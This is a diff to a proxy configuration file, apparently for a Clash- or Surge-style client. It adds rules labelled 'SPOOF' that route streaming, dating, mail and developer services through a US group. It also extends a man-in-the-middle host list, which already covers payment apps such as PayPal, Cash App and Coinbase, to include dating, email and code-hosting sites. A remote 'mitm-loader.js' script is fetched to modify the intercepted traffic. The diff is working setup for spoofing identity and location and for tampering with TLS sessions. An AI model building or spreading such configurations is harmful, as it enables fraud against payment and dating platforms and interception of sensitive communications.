@@ -63,6 +63,52 @@ rules:
   - { type: DOMAIN-SUFFIX, value: "binance.com", group: "US" }
   - { type: DOMAIN-SUFFIX, value: "gemini.com", group: "US" }
 
+  # === OTT / STREAMING / MEDIA SPOOF ===
+  - { type: DOMAIN-SUFFIX, value: "netflix.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "hulu.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "disneyplus.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "primevideo.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "paramountplus.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "hbomax.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "spotify.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "youtube.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "twitch.tv", group: "US" }
+
+  # === DATING / SOCIAL SPOOF ===
+  - { type: DOMAIN-SUFFIX, value: "tinder.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "bumble.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "okcupid.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "hinge.co", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "match.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "plentyoffish.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "coffeemeetsbagel.com", group: "US" }
+
+  # === MAIL / COMMUNICATIONS ===
+  - { type: DOMAIN-SUFFIX, value: "gmail.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "outlook.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "proton.me", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "yahoo.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "icloud.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "mail.com", group: "US" }
+
+  # === API / DEV / CLOUD / AI SERVICES ===
+  - { type: DOMAIN-SUFFIX, value: "github.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "github.io", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "gitlab.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "dropbox.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "dropboxusercontent.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "gdrive.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "googleapis.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "cloudflare.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "openai.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "claude.ai", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "anthropic.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "notion.so", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "zoom.us", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "slack.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "asana.com", group: "US" }
+  - { type: DOMAIN-SUFFIX, value: "figma.com", group: "US" }
+
 mitm_hostnames:
   - "*.paypal.com"
   - "*.cash.app"
@@ -84,6 +130,22 @@ mitm_hostnames:
   - "*.textnow.com"
   - "*.coinbase.com"
   - "*.chime.com"
+  - "*.netflix.com"
+  - "*.hulu.com"
+  - "*.disneyplus.com"
+  - "*.primevideo.com"
+  - "*.spotify.com"
+  - "*.youtube.com"
+  - "*.tinder.com"
+  - "*.bumble.com"
+  - "*.gmail.com"
+  - "*.proton.me"
+  - "*.yahoo.com"
+  - "*.icloud.com"
+  - "*.github.com"
+  - "*.gitlab.com"
+  - "*.dropbox.com"
+  - "*.notion.so"
 
 scripts:
   loader_url: "https://popdeuxrem.github.io/shadow-scripts/scripts/mitm-loader.js"
